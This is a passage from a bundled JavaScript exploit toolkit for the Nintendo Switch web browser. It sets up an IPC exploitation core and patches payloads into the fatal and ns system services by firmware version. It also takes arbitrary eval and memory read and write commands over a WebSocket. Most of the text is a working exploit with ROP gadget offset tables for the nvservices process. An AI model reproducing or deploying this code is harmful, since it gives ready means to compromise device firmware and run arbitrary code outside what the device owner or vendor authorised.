	}
};

sploitMixin.getServices = function(services, callback) {
	var serviceHandles = [];

	for (var si = 0; si < services.length; si++) {
		var service = this.getService(services[si]).assertOk();
		serviceHandles.push( service );
	}

	try {
		return callback.apply(undefined, serviceHandles);
	} finally {
		for (var shi = 0; si < serviceHandles.length; shi++) {
			this.svcCloseHandle(serviceHandles[shi]);
		}
	}
};

sploitMixin.registerService = function (name, maxSessions) {
	if (this.smHandle === undefined) {
		this.smHandle = this.svcConnectToPort('sm:').assertOk();
	}
	if (maxSessions === undefined) {
		maxSessions = 1000;
	}
	var lol = utils.str2u64(name);
	utils.dlog('Registering service ' + name);
	return this.ipcMsg(2).datau64(lol, [maxSessions, 0x20]).sendTo(this.smHandle).asResult().map((r) => r.movedHandles[0]);
};

sploitMixin.unregisterService = function (name) {
	if (this.smHandle === undefined) {
		this.smHandle = this.svcConnectToPort('sm:').assertOk();
	}
	var lol = utils.str2u64(name);
	return this.ipcMsg(3).datau64(lol).sendTo(this.smHandle).asResult();
};

sploitcore.prototype.hasService = function (name) {
	if (this.ipcServices[name] === undefined) {
		var r = this.registerService(name, 1000);
		if(r.isOk) {
			this.ipcServices[name] = false;
			this.unregisterService(name).assertOk();
		} else {
			this.ipcServices[name] = true;
		}
	}
	return this.ipcServices[name];
};

sploitMixin.getAutoHandle = function (name) {
	if (this.ipcHandles[name] === undefined) {
		if (name instanceof Function) {
			this.ipcHandles[name] = name();
		} else if (typeof(name) === "string") {
			this.ipcHandles[name] = this.getService(name).assertOk();
		} else {
			throw new Error("invalid auto handle type " + name);
		}
	}
	return this.ipcHandles[name];
};

sploitMixin.killAutoHandle = function (name) {
	if (name === undefined) {
		for (var name in this.ipcHandles) {
			this.killAutoHandle(name);
		}
		return;
	}

	if (this.ipcHandles[name] === undefined) { return; }

	this.svcCloseHandle(this.ipcHandles[name]).assertOk();
	delete this.ipcHandles[name];
};

module.exports = IPCMessage;

},{"./Result":4,"./ResultCode":5,"./sploitMixin":17,"./sploitcore":18,"./svc":19,"./utils":20}],11:[function(require,module,exports){
/* eslint camelcase: "off" */
/* eslint no-redeclare: "off" */
/* eslint no-eval: "off" */
/* global alert, WebSocket */
var reservedWords = require('reserved-words');

var SploitCore = require('./sploitcore');
window.IPCMessage = require('./ipc');
var utils = require('./utils');
var runNro = require('./runNro');
var nspwn = require('./nspwn');
var config = require('../config');

var socket;

window.onerror = function (msg, url, line, col, error) {
	if (msg === 'Out of memory') { alert(msg); }

	var stack = error ? error.stack : null;

	utils.send('error', [line, msg, stack]);
	if (socket) {
		socket.send(JSON.stringify({
			type: 'error',
			response: [ line, msg, stack ]
		}));
	}
	// location.reload();
};



utils.log('Loaded');

function handler (sc, socket) {
	return function (event) {
		var data = JSON.parse(event.data);

		if (data.cmd === 'sp') {
			utils.log('running getSP()...');
			socket.send(JSON.stringify({
				type: 'gotsp',
				response: utils.paddr(sc.getSP())
			}));
		} else if (data.cmd === 'gc') {
			utils.log('running GC');
			sc.gc();
			socket.send(JSON.stringify({
				type: 'gcran'
			}));
		} else if (data.cmd === 'malloc') {
			var size = parseInt(data.args[0]);
			var addr = sc.malloc(size);
			socket.send(JSON.stringify({
				type: 'mallocd',
				response: utils.paddr(addr)
			}));
		} else if (data.cmd === 'free') {
			var addr = utils.parseAddr(data.args[0]);
			sc.free(addr);
		} else if (data.cmd === 'write4' || data.cmd === 'write8') {
			utils.log(JSON.stringify(data));
			var addr = utils.parseAddr(data.args[0]);
			var value = parseInt(data.args[1]);
			var offset = parseInt(data.args[2]) || 0;

			sc[data.cmd](value, addr, offset);
		} else if (data.cmd === 'read4' || data.cmd === 'read8') {
			var addr = utils.parseAddr(data.args[0]);
			var offset = parseInt(data.args[1]) || 0;

			var response = sc[data.cmd](addr, offset);

			socket.send(JSON.stringify({
				type: 'rread',
				response: response
			}));
		} else if (data.cmd === 'readstring') {
			var addr = utils.parseAddr(data.args[0]);
			var length = parseInt(data.args[1]) || 0;

			socket.send(JSON.stringify({
				type: 'rreadstring',
				response: sc.readString(addr, length)
			}));
		} else if (data.cmd === 'eval') {
			var words = Object.keys(reservedWords.KEYWORDS['6-strict']);
			var code = data.args.join(' ');
			var ret = true;
			if (~code.indexOf('window.response')) {
				ret = false;
			}
			for (var i = 0; i < words.length; i++) {
				var w = words[i];
				var s = code.substr(0, w.length);
				if (s === w) {
					ret = false;
				}
			}
			if (ret) {
				code = 'window.response = ' + code;
			}
			window.response = null;
			eval('with (sc) { ' + code + '}');
			socket.send(JSON.stringify({
				type: 'evald',
				response: window.response || 'no output'
			}));
		} else if (data.cmd === 'evalfile') {
			var code = data.args[0];
			socket.send(JSON.stringify({
				type: 'evald',
				response: 'no output'
			}));
			eval('with (sc) {\n' + code + '\n}');
			socket.close();
		} else if (data.cmd === 'reboot') {
			socket.send(JSON.stringify({
				type: 'rebooting',
				response: 'Rebooting...'
			}));
			sc.ipcMsg(1).sendTo("bpc").assertOk();
		} else if (data.cmd === 'runnro') {
			runNro(data.args[0], data.args.slice(1));
			socket.send(JSON.stringify({
				type: 'rannro',
				response: 'no output'
			}));
		} else if (data.cmd === 'nspwn') {
			nspwn(data.args);
			socket.send(JSON.stringify({
				type: 'redirected',
				response: 'no output'
			}));
		}

	};
}

function setupListener (sc) {
	socket = new WebSocket('ws://' + window.location.hostname + ':8100');

	var handlerFcn = handler(sc, socket);
	socket.onmessage = (evt) => {
		try {
			handlerFcn(evt);
		} catch (e) {
			window.onerror(e.message, null, e.line, null, e);
		}
	};

	socket.onopen = function () {
		var requestScript = window.location.hash.substring(1);
		sc.getService("set:sys", (setcal) => {
			socket.send(JSON.stringify({
				type: "identification",
				serial: sc.ipcMsg(68).sendTo(setcal).assertOk().data,
				version: sc.version,
				script: requestScript
			}));
		});

		utils.log("Connected to PC...");
	};
 
	/* in this situation, we do not want client switches to reconnect to the server */

	/*socket.onerror = function() {
		utils.log("socket error, attempting to reconnect in 5 seconds...");
		window.setTimeout(() => {
			socket.close();
			setupListener(sc);
		}, 5000);
	};

	socket.onclose = function() {
		utils.log("socket closed, attempting to reconnect in 5 seconds...");
		window.setTimeout(() => {
			utils.log("attempting to reconnect...");
			setupListener(sc);
		}, 5000);
	};*/
}

function main () {
	// Find out firmware version
	if (navigator.userAgent.indexOf('NF/4.0.0.4.25 ') !== -1) {
		utils.version = 100;
	} else if (navigator.userAgent.indexOf('NF/4.0.0.5.9 ') !== -1) {
		utils.version = 200;
	} else if (navigator.userAgent.indexOf('NF/4.0.0.5.10 ') !== -1) {
		utils.version = 210;
	} else if (navigator.userAgent.indexOf('NF/4.0.0.6.9 ') !== -1) {
		utils.version = 300;
	} else if (navigator.userAgent.indexOf('NF/4.0.0.7.9 ') !== -1) {
		utils.version = 400;
	} else if (navigator.userAgent.indexOf('NF/4.0.0.8.9 ') !== -1) {
		utils.version = 500;
	} else if (navigator.userAgent.indexOf('NF/4.0.0.9.3 ') !== -1) {
		utils.version = 510;
	} else if (navigator.userAgent.indexOf('NF/4.0.0.10.13 ') !== -1) {
		utils.version = 600;
	} else {
		utils.log('Unknown firmware version detected!');
	}
	
	if (window.exploitMe === null) {
		utils.log('Exploit failed.');
		if (window.errmsg === null) { utils.log('Unknown reason.'); } else { utils.log(window.errmsg); }
		utils.log('~~failed');
		window.location.reload();
		return;
	}

	utils.log('Exploit triggered. Beginning breakage.');
	var sc = window.sc = new SploitCore(window.exploitMe); // Keep SC in window just so the GC never even tries to wipe us out. Just for sanity.

	// SDBCore is up
	if (sc.sdb != null && config.autorun) {
		sc.sdb.onready = function() {
			// AutoNRO
			utils.log("Running auto.nro");
			var xhr = new XMLHttpRequest();
			xhr.open('GET', '/nros/auto.nro', false);
			xhr.send(null);

			if (xhr.status === 200) {
				var nro = new Uint8Array(JSON.parse(xhr.response)).buffer;
				console.log(nro.length);
				runNro(nro).then((val) => {
					utils.log("autorun finished with " + utils.paddr(val));
					if(utils.trunc32(val) == 0 && config.autoclose) {
						utils.log("exiting...");
						window.close();
					}
				});
			}
		};
	}


	utils.log('Pegaswitch loaded!');
	utils.log('UA: ' + navigator.userAgent);

	// setupListener(sc);
	var code = "if (!sc.did_init) {\n    if (!sc.didModules) {\n        sc.memcpy = function(dst, src, size) { sc.call(utils.add2(sc.base, 0xF41B08), [dst, src, size]); }\n\n        if (sc.nv.vers == \"3.0.1\") {\n            sc.nv.modules.fatal.writePayloadAndPatch(0x167CB8); // 3.0.1\n        } else if (sc.nv.vers == \"4.0.1\") {\n            sc.nv.modules.fatal.writePayloadAndPatch(0x163278); // 4.0.1\n        } else if (sc.nv.vers == \"4.1.0\") {\n            sc.nv.modules.fatal.writePayloadAndPatch(0x163158); // 4.1.0\n        }\n        \n        \n        try {\n            sc.ipcMsg(0).datau64(sc.nv.modules.fatal.getAslrBase()).setType(5).sendTo('fatal:u');\n        } catch (rr) {\n            sc.killAutoHandle('fatal:u');\n            utils.log('Installed fatal!');\n        }\n        \n        if (sc.nv.vers == \"3.0.1\") {\n            sc.nv.modules.ns.writePayloadAndPatch(0x170ED8); // 3.0.1\n        } else if (sc.nv.vers == \"4.0.1\" || sc.nv.vers == \"4.1.0\") {\n            sc.nv.modules.ns.writePayloadAndPatch(0x190528); // 4.0.0\n        }\n        \n        try{\n            sc.ipcMsg(0).datau64(sc.nv.modules.ns.getAslrBase()).setType(5).sendTo('ns:vm');\n        } catch (rr) {\n            sc.killAutoHandle('ns:vm');\n            utils.log('Installed NS!');\n        }\n        \n        sc.lrHnd = sc.ipcMsg(301).datau64(0).sendTo('ns:vm').assertOk().show().movedHandles[0];\n        \n            sc.ipcMsg(0).datau32(3).sendTo(sc.lrHnd).asResult().andThen(res => {\n            sc.withHandle(res.movedHandles[0], function(hnd) {\n                var path = '@Sdcard://pegascape/caffeine.nsp';\n                var pbuf = utils.str2ab(path + '\\x00')\n                sc.ipcMsg(1).datau64(utils.parseAddr('0100000000001008')).xDescriptor(pbuf, pbuf.byteLength).sendTo(hnd).assertOk().show();\n                sc.nv.prepare_close();\n                prompt(\"Tap the text field below, wait three seconds, then tap the power button.\");\n            });\n        });\n        sc.didModules = true;\n    }\n\n    //window.showAlbumMessage();\n    sc.processes = {}\n    sc.did_init = true;\n}\nalert(\"Success!\");\n"
	eval('with (sc) {\n' + code + '\n}');
}

try {
	main();
} catch (e) {
	window.onerror(e.message, null, e.line, null, e);
}

},{"../config":1,"./ipc":10,"./nspwn":13,"./runNro":15,"./sploitcore":18,"./utils":20,"reserved-words":27}],12:[function(require,module,exports){
module.exports=[
  {
    "addrs": [
      "0x90c00000",
      "0x90900000",
      "0x86400000",
      "0x83E00000",
      "0x87000000",
			"0x87c00000",
      "0x86e00000",
      "0x86c00000"
    ],
    "name": "nvservices",
    "tid": "0100000000000019",
    "variations": [
      {
        "of": "0x13c8cc",
        "freeSpace": "0xeb6a0",
        "versions": [
          "1.0.0"
        ],
        "freeSpaceSize": "0x960"
      },
      {
        "of": "0x10ef0c",
        "versions": [
          "2.0.0"
        ],
        "freeSpace": "0xc9fcc",
        "freeSpaceSize": "0x34"
      },
      {
        "of": "0x10ef3c",
        "versions": [
          "2.1.0",
          "2.2.0"
        ],
        "freeSpace": "0xc9fcc",
        "freeSpaceSize": "0x34"
      },
      {
        "of": "0x10ff5c",
        "versions": [
          "2.3.0"
        ],
        "freeSpace": "0xca04c",
        "freeSpaceSize": "0xfb4"
      },
      {
        "of": "0x11b10c",
        "freeSpace": "0xd18e4",
        "versions": [
          "3.0.0/3.0.1"
        ],
        "freeSpaceSize": "0x71c"
      },
      {
        "of": "0x1194BC",
        "freeSpace": "0xd2218",
        "versions": [
          "4.0.1"
        ],
        "freeSpaceSize": "0xDE8"
      },
      {
        "of": "0x1194DC",
        "freeSpace": "0xd2458",
        "versions": [
          "4.1.0"
        ],
        "freeSpaceSize": "0xBA8"
      },
      {
        "of": "0x12604C",
        "freeSpace": "0xdf960",
        "versions": [
          "6.2.0"
        ],
        "freeSpaceSize": "0x400"
      }
    ]
  },
  {
    "addrs": [
      "0x88000000"
    ],
    "name": "ns",
    "tid": "010000000000001F",
    "variations": [
      {
        "of": "0x19db5c",
        "versions": [
          "1.0.0"
        ],
        "freeSpace": "0x119fbc",
        "freeSpaceSize": "0x44"
      },
      {
        "of": "0x19949c",
        "versions": [
          "2.0.0"
        ],
        "freeSpace": "0x102090",
        "freeSpaceSize": "0xf70"
      },
      {
        "of": "0x1995fc",
        "versions": [
          "2.1.0",
          "2.2.0",
          "2.3.0"
        ],
        "freeSpace": "0x102534",
        "freeSpaceSize": "0xacc"
      },
      {
        "of": "0x1673fc",
        "versions": [
          "3.0.0"
        ],
        "freeSpace": "0xdbc28",
        "freeSpaceSize": "0x3d8"
      },
      {
        "of": "0x1865ac",
        "versions": [
          "4.0.0"
        ],
        "freeSpace": "0x400",
        "freeSpaceSize": "0x1000"
      }
    ]
  },
  {
    "addrs": [
			"0x8ea00000",
            "0x8dc00000"
    ],
    "name": "fatal",
    "tid": "0100000000000034",
    "variations": [
      {
        "of": "0x16f85c",
        "versions": [
          "1.0.0"
        ],
        "freeSpace": "0x105ab4",
        "freeSpaceSize": "0x54c"
      },
      {
        "of": "0x14feac",
        "versions": [
          "2.0.0"
        ],
        "freeSpace": "0xe51b0",
        "freeSpaceSize": "0xe50"
      },
      {
        "of": "0x14ff3c",
        "versions": [
          "2.1.0",
          "2.2.0",
          "2.3.0"
        ],
        "freeSpace": "0xe53b0",
        "freeSpaceSize": "0xc50"
      },
      {
        "of": "0x15a54c",
        "versions": [
          "3.0.0"
        ],
        "freeSpace": "0xe6184",
        "freeSpaceSize": "0xe7c"
      },
      {
        "of": "0x1555cc",
        "versions": [
          "4.0.0"
        ],
        "freeSpace": "0x400",
        "freeSpaceSize": "0x1000"
      },
      {
        "of": "0x15561c",
        "versions": [
          "4.1.0"
        ],
        "freeSpace": "0x400",
        "freeSpaceSize": "0x1000"
      }

    ]
  }
]

},{}],13:[function(require,module,exports){
var utils = require("./utils");

module.exports = (args) => {
	sc.getService("lr", (lr) => {
		var path = utils.str2ab(args[0]);
		var tid  = [0x100D, 0x01000000];
		var storageId = 3;

		var msg = sc.ipcMsg(0).data(storageId).sendTo(lr).assertOk(); /* nn::lr::ILocationResolverManager(StorageId storageId) => nn::lr::ILocationResolver */
		sc.withHandle(msg.movedHandles[0], (h) => {                   /* nn::lr::ILocationResolver::SetProgramNcaPath(u64 TID, const char *path) */
			msg = sc.ipcMsg(1).data(tid).xDescriptor(path, path.byteLength, 0).sendTo(h).assertOk();
		});
	});
};

},{"./utils":20}],14:[function(require,module,exports){
var utils = require('./utils');
var svcMixin = require('./svc');
var sploitMixin = require('./sploitMixin');
var nsoInfo = require('./nso_info2.json');

var nvcore = function(sc, vers) {
	if (!nvcore.prototype.importedMixins) {
		Object.keys(svcMixin).forEach((k) => {
			nvcore.prototype[k] = svcMixin[k];
		});

		Object.keys(sploitMixin).forEach((k) => {
			nvcore.prototype[k] = sploitMixin[k];
		});

		nvcore.prototype.importedMixins = true;
	}

	utils.log('Starting nvcore...');
	this.sc = sc;
	window.sc = sc; // pls
	this.initialized = false;
	this.vers = vers;
	this.offsets = this.get_offsets();
	if (this.offsets == null) {
		utils.log('Unsupported version: '+vers);
		alert("Unfortunately firmware " + vers + " is not supported.");
		window.showExitMessage();
		return;
	}
	this.svcs = this.offsets['svc_dic'];
	
	this.tempBuf = new Uint32Array(8 * 1024 * 1024 / 4);
	this.tempBufAddr = utils.add2(this.sc.read8(this.sc.getAddr(this.tempBuf), 4), 0x100000);

	this.sploitMixinInit();

	utils.log('Pwning NV...');
	this.initialize(this.sc);
	utils.log('Pwned NV...');
};

nvcore.prototype.name = "nv";

nvcore.prototype.queryIOMapping = function(physAddr, size) {
	var virtAddr = utils.add2(this.ropBase, 0x40000);
	var ret = this.svc(0x55, [virtAddr, physAddr, size]);
	return this.rw.read(virtAddr);
};

nvcore.prototype.queryMem = function(addr, raw) {
	if(arguments.length == 1)
		raw = false;

	var meminfo = utils.add2(this.ropBase, 0x40000);
	var pageinfo = utils.add2(this.ropBase, 0x40028);

	var memperms = ['NONE', 'R', 'W', 'RW', 'X', 'RX', 'WX', 'RWX'];
	var memstates = ['NONE', '(1)', '(2)', 'CODE-STATIC', 'CODE', 'HEAP', 'SHARED-MEM-BLOCK', 'MODULE-CODE-STATIC', 'MODULE-CODE', 'STACK-MIRROR', 'THREAD-LOCAL-STORAGE', 'MEMORY_MIRROR', '(15)', 'RESERVED'];
	this.svc(0x6, [meminfo, pageinfo, addr]);

	var ms = this.rw.read(utils.add2(meminfo, 0x10));
	ms =  utils.paddr(ms);
	/*if(!raw && ms[1] == 0 && ms[0] < memstates.length)
    ms = memstates[ms[0]];
    else if(!raw)
    ms = 'UNKNOWN'*/
	var mp = this.rw.read(utils.add2(meminfo, 0x18));
	if(!raw && mp[1] == 0 && mp[0] < memperms.length)
		mp = memperms[mp[0]];

	var data = [this.rw.read(meminfo), this.rw.read(utils.add2(meminfo, 8)), ms, mp, this.rw.read(pageinfo)];

	return data;
};


nvcore.prototype.svc = function(id, registers, dump_regs) {
	if (arguments.length == 2)
		dump_regs = false;
	if (!(id in this.svcs)) {
		utils.log('Error: NV does not contain svc 0x'+id.toString(16));
		return null;
	}
	return this.slowCall(this.svcs[id], registers, [], dump_regs);
};

nvcore.prototype.initialize = function(sc) {
	if (this.initialized) {
		utils.log('Already initialized...returning.');
		return;
	}

	// Get RW primitive
	this.get_rw_primitive(sc);

	this.nv_base = utils.sub2(this.channel_addr, this.offsets['channel_to_base']);
 
    
	utils.log('this.base: '+utils.paddr(this.nv_base));
	utils.log('Testing arb read...');
	utils.log('*this.base: '+utils.paddr(this.rw.read(this.nv_base)));
    this.initialized = true;
	utils.log('Arb RW primitive works. Setting up caller...');
	this.fill_out_rop_buffer();
	utils.log('Filled out ROP buffer!');
	this.make_caller_obj();
	utils.log('Created caller object!');
    this.slowCall(0x220, []);
    utils.log('Verified call primitive!');
	this.scratch = utils.add2(this.ropBase, 0x30000);
	this.scratchOff = 0;
	this.ipcBufAddr = this.malloc(0x2000);
    utils.log('Allocated IPC Buf!');
    this.pageBuf = this.malloc(0x20000);
    utils.log('Allocated page buf: '+utils.paddr(this.pageBuf));
	utils.log('IPC BUF: '+utils.paddr(this.ipcBufAddr));

	if (this.vers == '3.0.0' && false) {
		utils.log('Setting up RO hax...');
		this.setup_ro_hax();
	} else {
        this.setup_gpu_rw();
    }

	this.initialized = true;
};

nvcore.prototype.get_offsets = function() {
	var offset_dic = {
            '4.1.0' : {
                'channel_to_base' : 0x62C6F8,
                'store_return_branch_a8' : 0x2254, //0x2208,
                'br_38' : 0x8A170, // 0x8690C
                'add_x8_br_x2' : 0xC7618, //0xC73FC,
                'add_x8_adj' : 0xBE8, //0x4C8,
                'ldr_blr_x9' : 0xC8B60, //0xC891C, 
                'partial_load' : 0xB6BC4, //0xB6F5C,
                'shuffle_x0_x8' : 0x1198C, //0xA1A0,
                'shuffle_x0_x8_ofs' : 0x20,
                'store_branch_60' : 0x31980, //0x31F94,
                'ldr_br_x1' : 0x2264, //0x2218,
                'save' : 0xB4158, //0xB44D8,
                'ldr_x0_ret' : 0xCA804,//0xCA5B0,
                'load' : 0xB6B8C, //0xB6F24,
                'br_x16' : 0x2E8,
                'ldr_x19_ret': 0x9E3C, //0x9DB8,
                'str_x20' : 0x6D5C, //0x6BF8,
                'str_x8_x19' : 0xC65FC, //0xC641C,
                'str_x0_x19' : 0x4B410, //0x4B0F8,
                'str_x2_x19' : 0x48818, //0x48614,
                'ldr_x8_str_0_x19' : 0xC1EC8, //0xC1EB8,
                'blr_x8_ret' : 0xFB5C, //0xFB54,
                'ldr_x2_str_x1_x2' : 0x124E8, //0x124BC,
                'ldr_x8_ldr_X1_br_x1' : 0xC1F40, //0xC1F30,
                'refresh_x19_x20' : 0xB4778, //0xB4AF0,
                'magic_copy_fuckery' : 0xF004, //0xEFFC,
                'return_address' : 0x4928, //0x4854,
                'nvdrv_heap' : 0x5D9FB0, //0x5DBFB0,
                'memcpy' : 0xBBD80, //0xBC0E8,
                'read4' : 0x7010, //0x6F00,
                'read4_adj' : 0x14,
                'write4' : 0x27698,//0x27600,
                'write4_adj' : 0x4,
                'read2' : 0x27618, //0x27580,
                'read2_adj' : 0x22, //0x24,
                'write2' : 0x27680, //0x275E8,
                'write2_adj' : 0x1E, //0x1A,
                'read1' : 0x2765C, //0x275C4,
                'read1_adj' : 0x3,
                'write1' : 0x2743C, //0x277A4,
                'write1_adj' : 0x0,
                'malloc' : 0x4B5F0, //0x4B2CC, 
                'free' : 0x4B600, //0x4B2DC,
                'malloc_heap' : 0x64A070, //0x64c070,
                'svc_dic' : {
                    0x2 : 0x123B0,
                    0x3 : 0x123B8,
                    0x4 : 0x123C0,
                    0x5 : 0x123C8,
                    0x6 : 0x123D0,
                    0x7 : 0x123E8,
                    0x8 : 0x123F0,
                    0x9 : 0x12408,
                    0xA : 0x12410,
                    0xB : 0x12418,
                    0xC : 0x12420,
                    0xD : 0x12438,
                    0x10 : 0x12440,
                    0x11 : 0x12448,
                    0x12 : 0x12450,
                    0x13 : 0x12458,
                    0x14 : 0x12460,
                    0x16 : 0x12468,
                    0x17 : 0x12470,
                    0x18 : 0x12478,
                    0x19 : 0x12490,
                    0x1A : 0x12498,
                    0x1B : 0x124A0,
                    0x1C : 0x124A8,
                    0x1D : 0x124B0,
                    0x1F : 0x124B8,
                    0x21 : 0x124D0,
                    0x22 : 0x124D8,
                    0x25 : 0x124E0,
                    0x26 : 0x124F8,
                    0x27 : 0x12500,
                    0x28 : 0x12508,
                    0x29 : 0x12510,
                    0x4E : 0x12528,
                    0x40 : 0x12540,
                    0x41 : 0x12560,
                    0x43 : 0x12578,
                    0x44 : 0x12590,
                    0x45 : 0x125A8,
                    0x51 : 0xCE88C,
                    0x52 : 0xCE894,
                    0x53 : 0xCE89C,
                    0x55 : 0xCE8B4,
                    0x56 : 0xCE8CC,
                    0x57 : 0xCE8E4,
                    0x58 : 0xCE8EC,
                    0x59 : 0xCE8F4,
                    0x5C : 0xCE8FC
                },
            },
        	'4.0.1' : {
			'channel_to_base' : 0x62C6F8,
            'store_return_branch_a8' : 0x2254, //0x2208,
			'br_38' : 0x89F30, // 0x8690C
			'add_x8_br_x2' : 0xC73D8, //0xC73FC,
			'add_x8_adj' : 0xBD8, //0x4C8,
			'ldr_blr_x9' : 0xC8920, //0xC891C, 
			'partial_load' : 0xB6984, //0xB6F5C,
			'shuffle_x0_x8' : 0x1198C, //0xA1A0,
            'shuffle_x0_x8_ofs' : 0x20,
			'store_branch_60' : 0x31980, //0x31F94,
			'ldr_br_x1' : 0x2264, //0x2218,
			'save' : 0xB3F18, //0xB44D8,
			'ldr_x0_ret' : 0xCA5C4,//0xCA5B0,
			'load' : 0xB694C, //0xB6F24,
			'br_x16' : 0x2E8,
			'ldr_x19_ret': 0x9E3C, //0x9DB8,
			'str_x20' : 0x6D5C, //0x6BF8,
			'str_x8_x19' : 0xC63BC, //0xC641C,
			'str_x0_x19' : 0x4B410, //0x4B0F8,
			'str_x2_x19' : 0x48818, //0x48614,
			'ldr_x8_str_0_x19' : 0xC1C88, //0xC1EB8,
			'blr_x8_ret' : 0xFB5C, //0xFB54,
			'ldr_x2_str_x1_x2' : 0x124E8, //0x124BC,
			'ldr_x8_ldr_X1_br_x1' : 0xC1D00, //0xC1F30,
			'refresh_x19_x20' : 0xB4538, //0xB4AF0,
			'magic_copy_fuckery' : 0xF004, //0xEFFC,
			'return_address' : 0x4928, //0x4854,
			'nvdrv_heap' : 0x5D9FB0, //0x5DBFB0,
			'memcpy' : 0xBBB40, //0xBC0E8,
			'read4' : 0x7010, //0x6F00,
			'read4_adj' : 0x14,
			'write4' : 0x27698,//0x27600,
			'write4_adj' : 0x4,
			'read2' : 0x27618, //0x27580,
			'read2_adj' : 0x22, //0x24,
			'write2' : 0x27680, //0x275E8,
			'write2_adj' : 0x1E, //0x1A,
			'read1' : 0x2765C, //0x275C4,
			'read1_adj' : 0x3,
			'write1' : 0x2743C, //0x277A4,
			'write1_adj' : 0x0,
			'malloc' : 0x4B5F0, //0x4B2CC, 
			'free' : 0x4B600, //0x4B2DC,
			'malloc_heap' : 0x64A070, //0x64c070,
			'svc_dic' : {
				0x2 : 0x123B0,
				0x3 : 0x123B8,
				0x4 : 0x123C0,
				0x5 : 0x123C8,
				0x6 : 0x123D0,
				0x7 : 0x123E8,
				0x8 : 0x123F0,
				0x9 : 0x12408,
				0xA : 0x12410,
				0xB : 0x12418,
				0xC : 0x12420,
				0xD : 0x12438,
                0x10 : 0x12440,
				0x11 : 0x12448,
				0x12 : 0x12450,
				0x13 : 0x12458,
				0x14 : 0x12460,
				0x16 : 0x12468,
				0x17 : 0x12470,
				0x18 : 0x12478,
				0x19 : 0x12490,
				0x1A : 0x12498,
                0x1B : 0x124A0,
				0x1C : 0x124A8,
				0x1D : 0x124B0,
				0x1F : 0x124B8,
				0x21 : 0x124D0,
				0x22 : 0x124D8,
				0x25 : 0x124E0,
				0x26 : 0x124F8,
				0x27 : 0x12500,
				0x28 : 0x12508,
				0x29 : 0x12510,
				0x4E : 0x12528,
				0x40 : 0x12540,
				0x41 : 0x12560,
				0x43 : 0x12578,
				0x44 : 0x12590,
				0x45 : 0x125A8,
                0x51 : 0xCE64C,
                0x52 : 0xCE654,
                0x53 : 0xCE65C,
                0x55 : 0xCE674,
                0x56 : 0xCE68C,
                0x57 : 0xCE6A4,
                0x58 : 0xCE6AC,
                0x59 : 0xCE6B4,
                0x5C : 0xCE6BC
			},
        },
		'3.0.1-disabled' : {
			'channel_to_base' : 0x62e6f8,
            'store_return_branch_a8' : 0x2208,
			'br_38' : 0x86940,
			'add_x8_br_x2' : 0xC743C,
			'add_x8_adj' : 0x4C8,
			'ldr_blr_x9' : 0xC895C,
			'partial_load' : 0xB6F90,
			'shuffle_x0_x8' : 0xA1A0,
            'shuffle_x0_x8_ofs' : 0x28,
			'store_branch_60' : 0x31FC8,
			'ldr_br_x1' : 0x2218,
			'save' : 0xB450C,
			'ldr_x0_ret' : 0xCA5F0,
			'load' : 0xB6F58,
			'br_x16' : 0x2E8,
			'ldr_x19_ret': 0x9DB8,
			'str_x20' : 0x6BF8,
			'str_x8_x19' : 0xC645C,
			'str_x0_x19' : 0x4B12C,
			'str_x2_x19' : 0x48648,
			'ldr_x8_str_0_x19' : 0xC1EF8,
			'blr_x8_ret' : 0xFB54,
			'ldr_x2_str_x1_x2' : 0x124BC,
			'ldr_x8_ldr_X1_br_x1' : 0xC1F70,
			'refresh_x19_x20' : 0xB4B24,
			'magic_copy_fuckery' : 0xEFFC,
			'return_address' : 0x4854, //0x2D34,
			'nvdrv_heap' : 0x5DBFB0,
			'memcpy' : 0xBC128,
			'read4' : 0x6F00,
			'read4_adj' : 0x14,
			'write4' : 0x27600,
			'write4_adj' : 0x4,
			'read2' : 0x27580,
			'read2_adj' : 0x24,
			'write2' : 0x275E8,
			'write2_adj' : 0x1A,
			'read1' : 0x275C4,
			'read1_adj' : 0x3,
			'write1' : 0x277A4,
			'write1_adj' : 0x0,
			'malloc' : 0x4B300, 
			'free' : 0x4B310,
			'malloc_heap' : 0x64c070,
			'svc_dic' : {
				0x2 : 0x12384,
				0x3 : 0x1238C,
				0x4 : 0x12394,
				0x5 : 0x1239C,
				0x6 : 0x123A4,
				0x7 : 0x123BC,
				0x8 : 0x123C4,
				0x9 : 0x123DC,
				0xA : 0x123E4,
				0xB : 0x123EC,
				0xC : 0x123F4,
				0xD : 0x1240C,
				0x11: 0x1241C,
				0x12 : 0x12424,
				0x13 : 0x1242C,
				0x14 : 0x12434,
				0x16 : 0x1243C,
				0x17 : 0x12444,
				0x18 : 0x1244C,
				0x19 : 0x12464,
				0x1A : 0x1246C,
				0x1C : 0x1247C,
				0x1F : 0x1248C,
				0x21 : 0x124A4,
				0x22 : 0x124AC,
				0x25 : 0x124B4,
				0x26 : 0x124CC,
				0x27 : 0x124D4,
				0x28 : 0x124DC,
				0x29 : 0x124E4,
				0x4E : 0x124FC,
				0x40 : 0x12514,
				0x41 : 0x12534,
				0x43 : 0x1254C,
				0x44 : 0x12564,
				0x45 : 0x1257C,
				0x51 : 0xCE050,
				0x52 : 0xCE058,
				0x53 : 0xCE060,
				0x55 : 0xCE078,
				0x56 : 0xCE090,
				0x57 : 0xCE0A8,
				0x58 : 0xCE0B0,
				0x59 : 0xCE0B8,
				0x5C : 0xCE0C0
			},
        },
        '3.0.0-disabled' : {
			'channel_to_base' : 0x62e6f8,
			'store_return_branch_a8' : 0x2208,
			'br_38' : 0x8690C,
			'add_x8_br_x2' : 0xC73FC,
			'add_x8_adj' : 0x4C8,
			'ldr_blr_x9' : 0xC891C,
			'partial_load' : 0xB6F5C,
			'shuffle_x0_x8' : 0xA1A0,
            'shuffle_x0_x8_ofs' : 0x28,
			'store_branch_60' : 0x31F94,
			'ldr_br_x1' : 0x2218,
			'save' : 0xB44D8,
			'ldr_x0_ret' : 0xCA5B0,
			'load' : 0xB6F24,
			'br_x16' : 0x2E8,
			'ldr_x19_ret': 0x9DB8,
			'str_x20' : 0x6BF8,
			'str_x8_x19' : 0xC641C,
			'str_x0_x19' : 0x4B0F8,
			'str_x2_x19' : 0x48614,
			'ldr_x8_str_0_x19' : 0xC1EB8,
			'blr_x8_ret' : 0xFB54,
			'ldr_x2_str_x1_x2' : 0x124BC,
			'ldr_x8_ldr_X1_br_x1' : 0xC1F30,
			'refresh_x19_x20' : 0xB4AF0,
			'magic_copy_fuckery' : 0xEFFC,
			'return_address' : 0x4854, //0x2D34,
			'nvdrv_heap' : 0x5DBFB0,
			'memcpy' : 0xBC0E8,
			'read4' : 0x6F00,
			'read4_adj' : 0x14,
